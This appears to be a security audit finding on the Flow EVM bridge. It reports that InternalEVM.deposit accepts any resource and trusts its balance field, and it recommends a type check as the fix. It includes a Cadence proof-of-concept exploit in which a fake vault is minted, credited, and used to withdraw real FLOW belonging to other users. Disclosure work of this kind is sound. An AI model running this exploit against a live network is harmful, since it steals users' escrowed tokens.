### Title
Fake Vault Deposit Bypasses FLOW Token Validation in EVM Bridge — (`File: fvm/evm/impl/impl.go`, `fvm/evm/stdlib/contract.go`)

### Summary
The `InternalEVM.deposit` host function accepts `AnyResource` as its `from` parameter type, while only reading the `balance` field to credit the EVM account. An unprivileged transaction sender can craft a custom Cadence resource with an inflated `balance: UFix64` field and call `InternalEVM.deposit` directly, bypassing the `@FlowToken.Vault` type enforcement present only in the higher-level `EVM.contract.cdc` wrappers. This allows the attacker to credit an EVM address with arbitrary FLOW balance without depositing real FLOW tokens, enabling theft of real FLOW from the bridge escrow.

### Finding Description

The Cadence-level public wrappers `EVMAddress.deposit(from: @FlowToken.Vault)` and `CadenceOwnedAccount.deposit(from: @FlowToken.Vault)` enforce that only a genuine `FlowToken.Vault` resource can be deposited into the EVM bridge. [1](#0-0) 

However, the underlying host function `InternalEVM.deposit` is declared with parameter type `sema.AnyResourceType`, not `@FlowToken.Vault`: [2](#0-1) 

The Go implementation of this host function (`newInternalEVMTypeDepositFunction`) only reads the `balance` field from whatever resource is passed, without verifying the resource's concrete type: [3](#0-2) 

It then constructs a `types.NewFlowTokenVault(amount)` from the extracted balance value and calls `account.Deposit(...)`, crediting the EVM account: [4](#0-3) 

`InternalEVM` is registered as a public contract value in the transaction environment via `stdlib.SetupEnvironment`, making it importable from user transactions: [5](#0-4) 

The `deposit` function is registered as a public function member on the `InternalEVM` contract type: [6](#0-5) 

### Impact Explanation

An attacker who calls `InternalEVM.deposit(from: <-fakeVault, to: attackerEVMAddress)` with a custom resource whose `balance` field is set to a large `UFix64` value will have that amount credited to their EVM address in the EVM state. The EVM bridge handler executes an internal EVM transfer from the native token bridge address to the attacker's EVM address for the full fake amount. If the bridge holds real FLOW deposited by other users, the attacker can subsequently call `CadenceOwnedAccount.withdraw(balance: ...)` to drain those real FLOW tokens from the bridge escrow into a Cadence `FlowToken.Vault`. This is a direct bridge escrow mis-accounting leading to cross-VM asset loss. [7](#0-6) 

### Likelihood Explanation

Any unprivileged Flow transaction sender can deploy a custom Cadence contract defining a resource with a `balance: UFix64` field, then import `InternalEVM` and call `deposit` directly. No special privileges, staked nodes, or leaked keys are required. The attack is viable whenever the bridge holds real FLOW from other users' deposits. [8](#0-7) 

### Recommendation

Change `InternalEVMTypeDepositFunctionType`'s `from` parameter type from `sema.AnyResourceType` to the concrete `FlowToken.Vault` composite type (or at minimum a restricted `{FungibleToken.Vault}` interface type). Additionally, add a runtime type assertion in `newInternalEVMTypeDepositFunction` to verify that the passed resource's static type matches `FlowToken.Vault` before reading its `balance` field and crediting the EVM account. [2](#0-1) 

### Proof of Concept

```cadence
// Attacker deploys this contract first
access(all) contract FakeToken {
    access(all) resource FakeVault {
        // Mimics the balance field read by newInternalEVMTypeDepositFunction
        access(all) var balance: UFix64
        init(balance: UFix64) {
            self.balance = balance
        }
    }
    access(all) fun createFakeVault(balance: UFix64): @FakeVault {
        return <- create FakeVault(balance: balance)
    }
}

// Attacker transaction
import InternalEVM from <EVMContractAddress>
import FakeToken from <AttackerAddress>
import EVM from <EVMContractAddress>

transaction {
    prepare(attacker: auth(Storage) &Account) {
        // Create a COA to receive the fake-credited balance
        let coa <- EVM.createCadenceOwnedAccount()
        let evmAddr = coa.address()

        // Create a fake vault with 1000 FLOW worth of balance
        let fakeVault <- FakeToken.createFakeVault(balance: 1000.0)

        // Call InternalEVM.deposit directly — AnyResource accepted, no type check
        // Go impl reads fakeVault.balance = 1000.0 and credits evmAddr in EVM state
        InternalEVM.deposit(from: <-fakeVault, to: evmAddr.bytes)

        // Withdraw real FLOW from the bridge escrow
        let realFlow <- coa.withdraw(balance: EVM.Balance(attoflow: 999_000_000_000_000_000))
        // realFlow is a genuine @FlowToken.Vault drained from other users' deposits

        attacker.storage.save(<-realFlow, to: /storage/stolenFlow)
        attacker.storage.save(<-coa, to: /storage/coa)
    }
}
```

```go
func newInternalEVMTypeDepositFunction(
	gauge common.MemoryGauge,
	handler types.ContractHandler,
) *interpreter.HostFunctionValue {
	return interpreter.NewStaticHostFunctionValue(
		gauge,
		stdlib.InternalEVMTypeDepositFunctionType,
		func(invocation interpreter.Invocation) interpreter.Value {
			context := invocation.InvocationContext

			// Get from vault

			fromValue, ok := invocation.Arguments[0].(*interpreter.CompositeValue)
			if !ok {
				panic(errors.NewUnreachableError())
			}

			amountValue, ok := fromValue.GetField(
				context,
				fungibleTokenVaultTypeBalanceFieldName,
			).(interpreter.UFix64Value)
			if !ok {
				panic(errors.NewUnreachableError())
			}

			amount := types.NewBalanceFromUFix64(cadence.UFix64(amountValue.UFix64Value))

			// Get to address

			toAddressValue, ok := invocation.Arguments[1].(*interpreter.ArrayValue)
			if !ok {
				panic(errors.NewUnreachableError())
			}

			toAddress, err := AddressBytesArrayValueToEVMAddress(context, toAddressValue)
			if err != nil {
				panic(err)
			}

			// NOTE: We're intentionally not destroying the vault here,
			// because the value of it is supposed to be "kept alive".
			// Destroying would incorrectly be equivalent to a burn and decrease the total supply,
			// and a withdrawal would then have to perform an actual mint of new tokens.

			// Deposit

			const isAuthorized = false
			account := handler.AccountByAddress(toAddress, isAuthorized)
			account.Deposit(types.NewFlowTokenVault(amount))

			return interpreter.Void
		},
	)
}
```
